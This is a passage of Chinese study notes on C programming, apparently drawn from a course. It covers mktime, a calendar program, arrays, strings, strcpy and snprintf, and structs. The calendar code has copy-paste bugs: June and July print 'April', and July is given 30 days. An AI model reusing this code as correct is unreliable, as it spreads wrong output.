Python \u4e2d\u53ef\u4ee5\u88ab\u7406\u89e3\u4e3a\u4e27\u5931\u4e86 function \u529f\u80fd\u7684 class\uff0c\u5b9a\u4e49\u6570\u636e\u7ed3\u6784:</p> <pre><code>class Point:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\n# \u521b\u5efa\u7c7b\u7684\u5b9e\u4f8b\np1 = Point(10, 20)\nprint(p1.x, p1.y)  # \u8f93\u51fa: 10 20\n</code></pre> <p>\u5728 time.h \u4e2d c \u8bed\u8a00\u4f7f\u7528\u4e86\u7ed3\u6784\u4f53\u5b9a\u4e49\u4e86 tm \u8fd9\u79cd\u6570\u636e\u7c7b\u578b\uff1a</p> <pre><code>struct tm {\n    int tm_sec;     /* seconds after the minute [0-60] */\n    int tm_min;     /* minutes after the hour [0-59] */\n    int tm_hour;    /* hours since midnight [0-23] */\n    int tm_mday;    /* day of the month [1-31] */\n    int tm_mon;     /* months since January [0-11] */\n    int tm_year;    /* years since 1900 */\n    int tm_wday;    /* days since Sunday [0-6] */\n    int tm_yday;    /* days since January 1 [0-365] */\n    int tm_isdst;   /* Daylight Savings Time flag */\n    long    tm_gmtoff;  /* offset from UTC in seconds */\n    char    *tm_zone;   /* timezone abbreviation */\n};\n</code></pre> <p>\u56e0\u6b64 <code>struct tm tm</code> \u4e3a\u58f0\u660e\u4e00\u4e2a tm \u6570\u636e\u7ed3\u6784\u7684\u540d\u4e3a tm \u7684\u53d8\u91cf</p> <pre><code>memset(&amp;tm, 0, sizeof(tm));\n</code></pre> <p>memset \u662f\u4e00\u4e2a\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u7528\u4e8e\u5c06\u4e00\u5757\u5185\u5b58\u533a\u57df\u4e2d\u7684\u6240\u6709\u5b57\u8282\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7684\u503c\u3002memset \u5c06 tm \u7ed3\u6784\u4f53\u7684\u6240\u6709\u5b57\u6bb5\u90fd\u8bbe\u7f6e\u4e3a 0. \u4e3a\u4e86\u4fdd\u8bc1 mktime \u51fd\u6570\u7684\u5de5\u4f5c\u6b63\u5e38\u8c03\u7528\u8be5\u51fd\u6570\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5982\u679c\u4e0d\u8c03\u7528\u624b\u52a8\u521d\u59cb\u5316\u76f8\u5bf9\u6765\u8bf4\u8f83\u4e3a\u9ebb\u70e6\uff1a</p> <pre><code>tm.tm_sec = 0;\ntm.tm_min = 0;\ntm.tm_hour = 0;\ntm.tm_mday = 1;\ntm.tm_mon = month - 1;\ntm.tm_year = year - 1900;\ntm.tm_wday = 0;  // \u8fd9\u4e9b\u5b57\u6bb5\u5b9e\u9645\u4e0a\u4f1a\u88ab mktime \u91cd\u65b0\u8ba1\u7b97\ntm.tm_yday = 0;\ntm.tm_isdst = 0;\n</code></pre> <p>\u5728 <code>time.h</code> \u6587\u4ef6\u91cc\u53ef\u4ee5\u770b\u5230\u5929\u4e3a 1 - 31 \u6b63\u5e38\u4f20\u53c2\u5b9a\u4e49\uff0c\u5468\u4e3a 0 - 11 \u8ba1\u7b97\uff0c\u5e74\u4e3a\u4ece 1900 \u5e74\u7b97\u8d77\uff0c\u56e0\u6b64\u5728\u540e\u7eed\u4f20\u53c2\u6570\u7ed9 <code>first_day_of_month(int month, int year)</code> \u540e\uff0c\u4f1a\u88ab\u81ea\u52a8\u5b9a\u4e49\u4e3a\u6307\u5b9a\u5e74\u4efd\u7684\u6307\u5b9a\u6708\u6570\u7684\u7b2c\u4e00\u5929\u3002\u7ecf\u8fc7 mktime \u51fd\u6570\u8ba1\u7b97\u8fc7\u540e\u4f1a\u8fd4\u56de\u6ca1\u6709\u5b9a\u4e49\u7684\u53d8\u91cf\uff0ctm_wday \u4f1a\u8fd4\u56de 0 - 6 \u5206\u522b\u4f9d\u6b21\u4ee3\u8868\u5468\u672b - \u5468\u516d\u3002</p>"},{"location":"cs/c/2.4/#mycalc","title":"mycal.c","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#include \"first_day_of_month.c\"\n\n#define DEFAULT_MONTH           8\n#define DEFAULT_YEAR            2023\n\n#define NWEEKS                  6\n#define DAYS_PER_WEEK           7\n\nvoid print_cal(int month, int year)\n{\n    int day1        = first_day_of_month(month, year);\n    int daysinmonth = 0;\n\n    switch (month) {\n        case 1: printf(\"   January %i\\n\", year);\n                daysinmonth = 31;\n                break;\n\n        case 2: printf(\"   February %i\\n\", year);\n                daysinmonth = 28;\n                break;\n\n        case 3: printf(\"   March %i\\n\", year);\n                daysinmonth = 31;\n                break;\n\n        case 4: printf(\"   April %i\\n\", year);\n                daysinmonth = 30;\n                break;\n\n        case 5: printf(\"   May %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 6: printf(\"   April %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 7: printf(\"   April %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 8: printf(\"   August %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 9: printf(\"   September %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 10: printf(\"   October %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 11: printf(\"   November %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 12: printf(\"   December %i\\n\", year);\n            daysinmonth = 31;\n            break;\n    }\n\n    printf(\"Su Mo Tu We Th Fr Sa\\n\");\n\n    int day = 1 - day1;\n    for(int w=0 ; w&lt;NWEEKS ; ++w) {\n        for(int d=0 ; d&lt;DAYS_PER_WEEK ; ++d) {\n            if(day &lt; 1 || day &gt; daysinmonth) {\n                printf(\".. \");\n            }\n            else {\n                printf(\"%2i \", day);\n            }\n            ++day;\n        }\n        printf(\"\\n\");\n    }\n}\n\nint main(int argcount, char *argvalue[ ])\n{\n    int month   = DEFAULT_MONTH;\n    int year    = DEFAULT_YEAR;\n\n    if(argcount &gt; 1) {\n        month   = atoi(argvalue[1]);\n        if(argcount &gt; 2) {\n            year = atoi(argvalue[2]);\n        }\n    }\n\n    print_cal(month, year);\n\n    return 0;\n}\n</code></pre> <p>\u7a0b\u5e8f\u7684\u6838\u5fc3\u7247\u6bb5\u7b97\u6cd5\u4e3a\u8be5 nested for loop:</p> <pre><code>for(int w = 0; w &lt; NWEEKS; ++w) {\n    for(int d = 0; d &lt; DAYS_PER_WEEK; ++d) {\n        if(day &lt; 1 || day &gt; daysinmonth) {\n            printf(\".. \");\n        }\n        else {\n            printf(\"%2i \", day);   // format using 2 columns\n        }\n        ++day;\n    }\n    printf(\"\\n\");       // move printing to a new line after each week\n}\n</code></pre>"},{"location":"cs/c/2.4/#outer-loop","title":"Outer Loop","text":"<p>w \u53d8\u91cf\uff1a\u8868\u793a\u5f53\u524d\u7684\u5468\u6570\uff0c\u4ece 0 \u5f00\u59cb\u5230 NWEEKS - 1\uff0c\u8fd9\u91cc NWEEKS \u88ab\u5b9a\u4e49\u4e3a 6\uff0c\u610f\u5473\u7740\u6700\u591a\u6253\u5370 6 \u884c\uff0c\u6bcf\u884c\u4ee3\u8868\u4e00\u5468\u3002</p> <p>\u5faa\u73af\u4f5c\u7528\uff1a\u5916\u5c42\u5faa\u73af\u8d1f\u8d23\u63a7\u5236\u884c\u6570\uff08\u5373\u5468\u6570\uff09\uff0c\u6bcf\u4e00\u8f6e\u5faa\u73af\u6253\u5370\u4e00\u5468\u7684\u65e5\u671f\u3002</p>"},{"location":"cs/c/2.4/#inner-loop","title":"Inner Loop","text":"<p>d \u53d8\u91cf\uff1a\u8868\u793a\u5f53\u524d\u7684\u5929\u6570\uff08\u4ece\u5468\u65e5\u5230\u5468\u516d\uff09\uff0c\u4ece 0 \u5f00\u59cb\u5230 DAYS_PER_WEEK - 1\uff0c\u8fd9\u91cc DAYS_PER_WEEK \u88ab\u5b9a\u4e49\u4e3a 7\uff0c\u8868\u793a\u4e00\u5468\u4e03\u5929\u3002</p> <p>\u5faa\u73af\u4f5c\u7528\uff1a\u5185\u5c42\u5faa\u73af\u8d1f\u8d23\u63a7\u5236\u4e00\u5468\u4e2d\u6bcf\u5929\u7684\u8f93\u51fa\uff0c\u786e\u4fdd\u5728\u6bcf\u4e00\u884c\u4e2d\u6253\u5370\u51fa\u4ece\u5468\u65e5\u5230\u5468\u516d\u7684\u65e5\u671f\u3002</p>"},{"location":"cs/c/2.4/#_1","title":"\u5224\u65ad\u903b\u8f91","text":"<pre><code>if(day &lt; 1 || day &gt; daysinmonth) {\n    printf(\".. \");\n} else {\n    printf(\"%2i \", day);   // format using 2 columns\n}\n</code></pre> <ul> <li>day \u53d8\u91cf\uff1aday \u662f\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5f53\u524d\u9700\u8981\u6253\u5370\u7684\u65e5\u671f\u3002\u8fd9\u4e2a\u53d8\u91cf\u6700\u521d\u88ab\u521d\u59cb\u5316\u4e3a 1 - day1\uff0c\u5176\u4e2d day1 \u662f\u8fd9\u4e2a\u6708\u7b2c\u4e00\u5929\u7684\u661f\u671f\u6570\uff08\u4f8b\u5982\uff0c0 \u8868\u793a\u661f\u671f\u65e5\uff0c1 \u8868\u793a\u661f\u671f\u4e00\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff09\u3002</li> </ul> <ul> <li> <p>if(day &lt; 1 || day &gt; daysinmonth) \u6761\u4ef6\uff1a</p> <ul> <li>\u5982\u679c day \u5c0f\u4e8e 1\uff08\u8868\u793a\u5f53\u524d\u7684\u65e5\u671f\u5728\u8fd9\u4e2a\u6708\u5f00\u59cb\u4e4b\u524d\uff09\u6216\u8005\u5927\u4e8e daysinmonth\uff08\u8868\u793a\u5f53\u524d\u7684\u65e5\u671f\u5df2\u7ecf\u8d85\u51fa\u4e86\u8fd9\u4e2a\u6708\u7684\u5929\u6570\uff09\uff0c\u5c31\u6253\u5370 \"..\" \u4f5c\u4e3a\u5360\u4f4d\u7b26\u3002</li> </ul> <ul> <li>\u8fd9\u6837\u53ef\u4ee5\u4fdd\u6301\u6bcf\u4e00\u884c\u7684\u683c\u5f0f\u4e00\u81f4\uff0c\u5c24\u5176\u662f\u5728\u7b2c\u4e00\u4e2a\u661f\u671f\u5f00\u59cb\u4e4b\u524d\u7684\u7a7a\u767d\u5904\u548c\u6700\u540e\u4e00\u4e2a\u661f\u671f\u7ed3\u675f\u540e\u7684\u7a7a\u767d\u5904\u3002</li> </ul> </li> </ul> <ul> <li> <p>else \u5206\u652f\uff1a</p> <ul> <li>\u5982\u679c day \u5728\u5408\u6cd5\u8303\u56f4\u5185\uff08\u5373\u5927\u4e8e\u6216\u7b49\u4e8e 1 \u4e14\u5c0f\u4e8e\u6216\u7b49\u4e8e daysinmonth\uff09\uff0c\u5219\u6253\u5370\u5f53\u524d\u65e5\u671f\u3002%2i \u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u8868\u793a\u6253\u5370\u4e00\u4e2a\u53f3\u5bf9\u9f50\u7684\u4e24\u4f4d\u6570\u65e5\u671f\u3002</li> </ul> <ul> <li>++day\uff1a\u6bcf\u6253\u5370\u4e00\u5929\uff0cday \u53d8\u91cf\u81ea\u589e 1\uff0c\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u65e5\u671f\u3002</li> </ul> </li> </ul> <ul> <li>\u5728\u5185\u5c42\u5faa\u73af\u7ed3\u675f\u540e\uff0c\u8c03\u7528 printf(\"\\n\"); \u5c06\u6253\u5370\u79fb\u52a8\u5230\u4e0b\u4e00\u884c\uff0c\u4ece\u800c\u5f00\u59cb\u6253\u5370\u4e0b\u4e00\u5468\u7684\u65e5\u671f\u3002</li> </ul>"},{"location":"cs/c/2.4/#conclusion","title":"Conclusion","text":"<p>\u8be5\u7a0b\u5e8f\u6838\u5fc3\u4e3a\u8c03\u7528 mktime \u51fd\u6570\u4f20\u53c2\u6307\u5b9a\u5e74\u4efd\u548c\u6708\u6570\u4ee5\u53ca\u5f53\u6708\u7684\u7b2c\u4e00\u5929\uff0c\u83b7\u5f97\u5176\u8fd4\u56de\u7684\u5f53\u6708\u7684\u7b2c\u4e00\u5929\u5c5e\u4e8e\u7b2c\u51e0\u5468\u3002\u7136\u540e\u4f7f\u7528 nested for loop \u6253\u5370\u4e8c\u7ef4\u77e9\u9635\uff1a\u5916\u5c42\u8d1f\u8d23\u63a7\u5236\u6700\u5927\u5468\u6570\uff0c\u4e00\u4e2a\u6708\u6700\u5927\u7684\u5468\u6570\u4e0d\u4f1a\u8d85\u8fc7 6 \u884c\uff0c\u56e0\u6b64\u5728\u6253\u5370 2 \u6708\u7684\u65f6\u5019\u53ef\u4ee5\u53d1\u73b0\u6700\u540e\u4e00\u5468\u5168\u90e8\u88ab\u66ff\u6362\u6210\u4e86 ..</p> <pre><code>   February 2023\nSu Mo Tu We Th Fr Sa\n.. .. ..  1  2  3  4 \n 5  6  7  8  9 10 11 \n12 13 14 15 16 17 18 \n19 20 21 22 23 24 25 \n26 27 28 .. .. .. .. \n.. .. .. .. .. .. .. \n</code></pre> <p>\u5185\u5c42\u5faa\u73af\u4e3b\u8981\u5224\u65ad\u5f53\u6708\u7b2c\u4e00\u5929\u7684\u8d77\u59cb\u4f4d\u7f6e\uff0c\u7528 1 - day1 \u7684\u7b97\u6cd5\u786e\u5b9a\u6709\u591a\u5c11\u4e2a\u7a7a\u5929\u6570\uff0c\u4f8b\u5982\u5468\u4e94\u5c31\u662f -4, [-4, -3, -2, -1, 0] \u4e00\u76f4\u5230\u7b49\u4e8e 1 \u7684\u65f6\u5019\u5c31\u80fd\u786e\u8ba4\u8be5\u5217\u662f\u7b2c\u4e00\u5929\uff0c\u7136\u540e\u7528 <code>%2i</code> \u7684\u683c\u5f0f\u4fdd\u8bc1\u4e24\u4e2a\u5b57\u6bb5\u5bbd\u5ea6\u8f93\u51fa\u5929\u6570\uff0c\u4e3b\u8981\u4e3a\u4e86\u4fdd\u8bc1\u683c\u5f0f\u5316\u8f93\u51fa\u540e\u7684\u7f8e\u89c2\u6574\u9f50\uff0c\u7136\u540e\u9010\u6e10\u589e\u52a0 day \u7684\u5929\u6570\u76f4\u5230\u8d85\u8fc7\u5f53\u6708\u63d0\u524d\u5b9a\u4e49\u597d\u7684\u6700\u5927\u5929\u6570\u3002</p> <pre><code>   December 2023\nSu Mo Tu We Th Fr Sa\n.. .. .. .. ..  1  2 \n 3  4  5  6  7  8  9 \n10 11 12 13 14 15 16 \n17 18 19 20 21 22 23 \n24 25 26 27 28 29 30 \n31 .. .. .. .. .. .. \n</code></pre> <p>\u7a0b\u5e8f\u7528\u5230\u4e86 atoi \u7ed9 argvalue \u8f6c\u6362\u6570\u636e\u7c7b\u578b\u4e3a integer, \u7528 switch \u8bed\u53e5\u63d0\u524d\u6253\u5370\u7b2c\u4e8c\u884c\u7684\u6708\u4efd\u5e76\u624b\u52a8\u5b9a\u4e49\u6700\u5927\u5929\u6570\uff0c\u56e0\u6b64\u5728 switch \u4e2d\u6ca1\u6709\u7528\u5230 default \u8bed\u53e5\u3002\u6559\u6388\u8fd8\u7528\u5230\u4e86 <code>#define</code> \u8bed\u53e5\u63d0\u524d\u5b9a\u4e49\u4e00\u4e9b\u5e38\u91cf\uff0c\u8282\u7701\u5185\u5b58\u4e0e\u7f16\u8bd1\u5668\u65f6\u95f4\u3002</p>"},{"location":"cs/c/3.1/","title":"3.1 Data Structure","text":""},{"location":"cs/c/3.1/#mon-wed-lecture","title":"Mon &amp; Wed Lecture","text":"<p>\u4e3b\u8981\u8bb2\u8ff0\u4e86\u6570\u636e\u7ed3\u6784\u4e0e <code>struct</code> \u6570\u7ec4\u5b9a\u4e49</p>"},{"location":"cs/c/3.1/#arrays","title":"arrays","text":"<p>\u65e0\u8bba\u4f60\u7528\u4ec0\u4e48\u7f16\u7a0b\u8bed\u8a00\uff0c\u53cc\u5217\u8868\u7b2c\u4e00\u4e2a\u505a\u7684\u4e8b\u6c38\u8fdc\u662f\u628a\u7b2c\u4e00\u4e2a\u7ef4\u5ea6\u89c6\u4e3a\u884c\uff0c\u7b2c\u4e8c\u4e2a\u7ef4\u5ea6\u89c6\u4e3a\u5217</p>"},{"location":"cs/c/3.1/#initialization","title":"Initialization","text":"<p>\u6211\u4eec\u4e00\u822c\u503e\u5411\u4e8e\u5728 C \u6587\u4ef6\u5f00\u5934\u4f7f\u7528 <code>define</code> \u8bed\u53e5\u63d0\u524d\u5b9a\u4e49\u597d\u5217\u8868\u7684\u5185\u5b58\u5927\u5c0f</p> <pre><code>#define  N   20\n\nint   myarray[ N ];\nint   evensum;\n\nevensum = 0;\nfor(int i=0 ; i &lt; N ; ++i) {\n    myarray[ i ] = i * 2;                                  \n    evensum      = evensum + myarray[ i ];\n}\n</code></pre> <p>\u4e00\u7ef4\u5217\u8868\u7684\u521d\u59cb\u5316\u65b9\u6cd5\u5982\u4e0b\uff0c\u548c Python \u4e0d\u540c\u7684\u662f C \u7684\u4e00\u5207\u90fd\u9700\u8981\u63d0\u524d\u5728\u5185\u5b58\u4e2d\u521d\u59cb\u5316\u597d\u540e\u518d\u63a5\u5165\u5176\u5143\u7d20\uff0c\u6709\u8fd0\u884c\u65f6\u521d\u59cb\u5316\u5e76\u5206\u914d\u5143\u7d20\u4e0e\u7f16\u8bd1\u65f6\u521d\u59cb\u5316\u4e24\u79cd\u65b9\u6848</p> <p>initialize the elements at run-time, by executing statements to assign values to the elements</p> <pre><code>#define  N   5\n\nint   myarray[ N ];\n\n....\n\n    for(int i=0 ; i &lt; N ; ++i) {\n        myarray[ i ] = i;\n    }\n</code></pre> <p>initialize the values at compile-time, by telling the compiler what values to initially store in the memory</p> <pre><code>#define  N   5\n\nint   myarray[ N ] = { 0, 1, 2, 3, 4 };\n</code></pre> <p>\u7f16\u8bd1\u65f6\u8ba9\u81ea\u52a8\u521d\u59cb\u5316\u5206\u914d\u5185\u5b58\u5927\u5c0f</p> <pre><code>int   myarray[ ] = { 0, 1, 2, 3, 4 };\n\n#define  N   (sizeof(myarray) / sizeof(myarray[0]))\n</code></pre> <p>\u5728\u4e0d\u6307\u5b9a\u5185\u5b58\u5927\u5c0f\u7684\u65f6\u5019\uff0c\u7f16\u8bd1\u65f6\u4f1a\u6839\u636e\u5143\u7d20\u6570\u91cf\u81ea\u52a8\u63a8\u5012\uff0cdefine \u8fd9\u884c\u5217\u8868\u4e2d\u90fd\u662f\u540c\u4e00\u7c7b\u578b\u7684\u6570\u636e\uff0c\u6bcf\u4e2a int \u5143\u7d20\u5360\u636e 4 bytes, sizeof(array) \u4f1a\u8fd4\u56de\u5217\u8868\u5927\u5c0f\u4e5f\u5c31\u662f 4 * 5 = 20, \u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\u4e3a 4 \u76f8\u9664\u5c31\u6210\u4e86\u5217\u8868\u957f\u5ea6\u3002</p> <p>\u63d0\u524d\u9884\u7559\u5185\u5b58\u4e0e\u6307\u5b9a\u90e8\u5206\u5143\u7d20</p> <pre><code>#define  HUGE   10000\n\nint   myarray[ HUGE ] = { 4, 5 };\n</code></pre> <p>\u5728 run-time \u540e define \u624d\u80fd\u786e\u5b9a\u5927\u5c0f\u7684\u6570\u7ec4\u88ab\u79f0\u4e4b\u4e3a  variable-length arrays, or variable-sized arrays \u4e5f\u5c31\u662f\u53ef\u53d8\u957f\u5ea6\u6570\u7ec4\u548c\u53ef\u53d8\u5927\u5c0f\u6570\u7ec4\uff1b\u4f46\u7531\u4e8e\u5176\u5728\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e2d\u5b9e\u73b0\u6548\u7387\u4f4e\u4e0b\uff0c\u73b0\u4ee3 Linux \u5185\u6838\u79fb\u9664\u4e86\u53ef\u53d8\u957f\u5ea6\u6570\u7ec4\uff0cC11 \u4e2d\u6210\u4e3a\u4e86\u53ef\u9009\u5b9a\u4e49\u3002\u5e76\u4e14\u53ef\u53d8\u957f\u5ea6\u6570\u7ec4\u90fd\u53ef\u4ee5\u5728\u4e00\u4e2a\u51fd\u6570\u4e2d\u5b9a\u4e49\u5e76\u4f20\u9012\u7ed9\u53e6\u4e00\u4e2a\u51fd\u6570\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u5927\u5c0f\u5728\u8fd0\u884c\u65f6\u4e4b\u524d\u662f\u672a\u77e5\u7684\uff0c\u56e0\u6b64\u4e5f\u5fc5\u987b\u4f20\u9012\u6570\u7ec4\u7684\u5927\u5c0f\u3002\u65e0\u6cd5\u6839\u636e\u6570\u7ec4\u7684\u540d\u79f0\u786e\u5b9a\u6570\u7ec4\u7684\u5927\u5c0f\u3002</p> <pre><code>void function2(int array_size, char vla[ ])\n{\n    for(int i=0 ; i &lt; array_size ; ++i) {\n        // access vla[i] ...\n        ....\n    }\n}\n\nvoid function1(void)\n{\n    int size = read an integer from keyboard or a file;\n\n    char vla[ size ];\n\n    function2(size, vla);\n}\n</code></pre>"},{"location":"cs/c/3.1/#strings","title":"strings","text":"<p>\u7531\u4e8e C \u4e2d\u4e0d\u5177\u5907\u5b57\u7b26\u4e32\u8fd9\u79cd\u57fa\u7840\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4f7f\u7528\u7684\u662f char array \u6570\u7ec4\u5b57\u7b26\u53bb\u5b9e\u73b0\uff0c\u65e0\u8bba\u662f <code>#include &lt;string.h&gt;</code> \u4e0b\u53ef\u88ab\u8c03\u7528\u7684\u529f\u80fd\u8ba1\u7b97\u5b57\u7b26\u957f\u5ea6\uff0c\u662f\u5426\u76f8\u7b49\uff0c\u62f7\u8d1d\u7b49\u548c <code>printf</code> \u4e00\u6837\u90fd\u672c\u8d28\u662f\u7ba1\u7406\u5b57\u7b26\u6570\u7ec4\u3002</p> <pre><code>char greeting[5] = { 'h', 'e', 'l', 'l', 'o' };\n\nchar today[6]    = \"Monday\";\n\nchar month[]     = \"August\";\n</code></pre> <p>\u548c int \u4e00\u6837\u540c\u6837\u652f\u6301\u81ea\u52a8\u8ba1\u7b97\u5206\u914d\u6240\u9700\u5927\u5c0f</p>"},{"location":"cs/c/3.1/#strings-are-terminated-by-a-special-character","title":"Strings are terminated by a special character","text":"<p>\u5728\u6570\u7ec4\u4e2d <code>\\0</code> \u88ab\u79f0\u4e3a null byte, \u4e00\u822c\u7528\u4e8e char arrary \u4e2d\u7684\u672b\u5c3e\u5e8f\u5217\uff0c\u6807\u660e string \u5230\u8fd9\u91cc\u5c31\u5904\u7406\u7ed3\u675f\u4e86\uff1a</p> <pre><code>h e l l o \\0\n</code></pre> <p>\u8fd9\u4e2a\u5b57\u7b26\u9700\u8981\u516d\u4e2a\u5b57\u8282\u7684\u5185\u5b58\u624d\u80fd\u88ab\u6b63\u5e38\u50a8\u5b58\uff0c\u4f46\u662f strlen \u8fd9\u6837\u7684\u51fd\u6570\u8fd4\u56de\u4f1a\u663e\u793a 5</p> <p>\u5148\u524d\u7684\u6848\u4f8b <code>char month[] = \"August\";</code> \u4e2d\uff0c\u5b9e\u9645\u4e0a\u7cfb\u7edf\u81ea\u52a8\u7ed9 August \u672b\u5c3e\u5206\u914d\u4e86\u4e00\u4e2a <code>\\0</code> \u7b26\uff0c\u4f7f\u7528\u4e86 7 \u4e2a\u4f4d\u7f6e\u50a8\u5b58,\uff0c\u4f46\u5728 Monday \u4e2d\u7531\u4e8e\u6307\u5b9a\u4e86\u5185\u5b58\u5927\u5c0f\u56e0\u6b64\u4e0d\u4f1a\u88ab\u81ea\u52a8\u5206\u914d <code>\\0</code> \u7b26</p> <pre><code>h e l l o wo r l d \\0\n</code></pre> <p>\u5982\u679c\u6267\u884c <code>arrary[5] = '\\0'</code>, \u6570\u7ec4\u4ecd\u7136\u4f1a\u5360\u636e 12 \u4e2a\u5b57\u8282\u7684\u50a8\u5b58\u7a7a\u95f4\uff0c\u4f46\u662f\u5982\u679c\u6253\u5370\u51fa\u6765\u5c31\u53ea\u4f1a\u5f97\u5230 hello</p>"},{"location":"cs/c/3.1/#copy-one-string-into-another","title":"copy one string into another","text":"<p>solution one\uff1a for loop</p> <pre><code>void my_strcpy(char destination[], char source[])\n{\n    int length = strlen(source);\n\n    for(int i = 0 ; i &lt; length ; ++i) {\n        destination[i] = source[i];\n    }\n    destination[length] = '\\0';\n}\n</code></pre> <p>\u89e3\u51b3\u65b9\u6848\u4e00\u662f\u9996\u5148\u8ba1\u7b97\u957f\u5ea6\u7136\u540e\u63d2\u8fdb\u65b0\u6570\u7ec4\u5185\u5bb9\uff0c\u6700\u540e\u63d2\u5165 <code>\\0</code> \u7ed3\u675f</p> <p>solution two: while loop unbounded loop:</p> <pre><code>void my_strcpy(char destination[], char source[])\n{\n    int  i = 0;\n\n    while(source[i] != '\\0') {\n        destination[i] = source[i];\n        i = i+1;\n    }\n    destination[i] = '\\0';\n}\n</code></pre> <p>\u6839\u636e\u539f source \u6570\u7ec4\u5224\u65ad\uff0c\u53ea\u8981\u4e0d\u662f null byte \u5c31\u7ee7\u7eed\u590d\u5236\uff0cdo while \u540c\u6837\u53ef\u4ee5\u5b9e\u73b0</p> <pre><code>// USE AN UNBOUNDED LOOP, COPYING UNTIL THE NULL-BYTE \n\nvoid my_strcpy(char destination[], char source[])\n{\n    int  i = 0;\n\n    do {\n        destination[i] = source[i];\n        i = i+1;\n    } while(source[i-1] != '\\0');\n}\n</code></pre>"},{"location":"cs/c/3.1/#sprintf-","title":"sprintf - \u683c\u5f0f\u5316\u5199\u5165\u53d8\u91cf","text":"<p>\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u6211\u4eec\u7684\u201c\u8f93\u51fa\u201d\u88ab\u5199\u5165\u5b57\u7b26\u6570\u7ec4\uff0c\u800c\u4e0d\u662f\u5230\u5c4f\u5e55\u4e0a\u3002</p> <pre><code>#include &lt;stdio.h&gt;\n\nchar chess_outcome[64];\n\nif(winner == WHITE) {\n    sprintf(chess_outcome, \"WHITE with %i\", nwhite_pieces);\n}\nelse {\n    sprintf(chess_outcome, \"BLACK with %i\", nblack_pieces);\n}\nprintf(\"The winner: %s\\n\", chess_outcome);\n</code></pre> <p>\u9ed8\u8ba4\u53ef\u4ee5\u8fd9\u6837\u7528\uff0c\u4f46\u7531\u4e8e\u4e0d\u8981\u8d85\u8fc7\u63a5\u6536\u683c\u5f0f\u5316\u6253\u5370\u7684\u6570\u7ec4\u7684\u6700\u5927\u957f\u5ea6\uff0c\u56e0\u6b64\u53ef\u4ee5\u5b9a\u4e49</p> <pre><code>char chess_outcome[64];\n\n//  FORMAT, AT MOST, A KNOWN NUMBER OF CHARACTERS\nif(winner == WHITE) {\n    snprintf(chess_outcome, 64, \"WHITE with %i\", nwhite_pieces);\n}\n\n//  OR, GREATLY PREFERRED:\nif(winner == WHITE) {\n    snprintf(chess_outcome, sizeof(chess_outcome), \"WHITE with %i\", nwhite_pieces);\n}\n</code></pre>"},{"location":"cs/c/3.1/#struct","title":"struct","text":""},{"location":"cs/c/3.1/#anonymous-struct","title":"anonymous struct","text":"<p>\u6559\u6388\u7528\u4e86 RGB \u8c03\u8272\u76d8\u9996\u5148\u4e3e\u4f8b\u533f\u540d struct \u5176\u673a\u5236\uff1a</p> <p>C provides a mechanism to bring related data together, structures, using the struct keyword.</p> <pre><code>//  DEFINE AND INITIALIZE ONE VARIABLE THAT IS A STRUCTURE\nstruct {\n    char    *name;   // a pointer to a sequence of characters\n    int     red;     // in the range 0..255\n    int     green;\n    int     blue;\n} rgb_colour = {\n    \"DodgerBlue\",\n     30,\n    144,\n    255\n};\n\nprintf(\"Color name: %s\\n\", rgb_colour.name);\nprintf(\"RGB: (%d, %d, %d)\\n\", rgb_colour.red, rgb_colour.green, rgb_colour.blue);\n</code></pre> <p>\u533f\u540d\u7ed3\u6784\u4f53\u5728 struct \u540e\u6ca1\u6709\u6807\u660e\u7ed3\u6784\u4f53\u7c7b\u578b / \u6570\u636e\u7c7b\u578b\uff0c<code>{}</code> \u540e\u5b9a\u4e49\u4e86\u4e00\u4e2a variable, \u56e0\u6b64\u5728\u8c03\u7528\u7684\u65f6\u5019\u4e0d\u9700\u8981\u5148\u5bf9\u7ed3\u6784\u4f53\u8fdb\u884c\u6570\u636e\u7c7b\u578b\u58f0\u660e\u76f4\u63a5\u7528</p> <p>variable \u4e5f\u53ef\u4ee5\u662f\u6570\u7ec4\uff1a</p> <pre><code>struct myStructure s1[3] = {\n    {13, 'B', \"Some text\"},\n    {25, 'C', \"Another text\"},\n    {42, 'D', \"More text\"}\n};\n\nprintf(\"s1[0] - number: %d, letter: %c, text: %s\\n\", s1[0].number, s1[0].letter, s1[0].text);\nprintf(\"s1[1] - number: %d, letter: %c, text: %s\\n\", s1[1].number, s1[1].letter, s1[1].text);\n</code></pre>"},{"location":"cs/c/3.1/#multiple-football-teams","title":"Multiple football teams","text":"<p>\u8fd9\u4e2a\u6848\u4f8b\u5c31\u662f C11 \u4e2d struct \u533f\u540d\u51fd\u6570\u7684\u6570\u7ec4 variable \u7528\u6cd5</p> <p>\u591a\u4e2a TEAM \u7684\u5185\u5bb9\u90fd\u53ef\u88ab\u81ea\u5b9a\u4e49\uff0c\u7136\u540e\u5faa\u73af\u6253\u5370\u6bcf\u4e2a TEAM \u7684\u5143\u7d20</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define MAX_TEAMS               3           // \u5b9a\u4e49\u961f\u4f0d\u6570\u91cf\n#define MAX_TEAMNAME_LEN        30          // \u6700\u5927\u961f\u4f0d\u540d\u79f0\u957f\u5ea6\n\n// \u5b9a\u4e49\u7403\u961f\u7684\u7ed3\u6784\u4f53\u6570\u7ec4\nstruct {\n    char    teamname[MAX_TEAMNAME_LEN+1];   // \u961f\u4f0d\u540d\u79f0\n    int     played;                    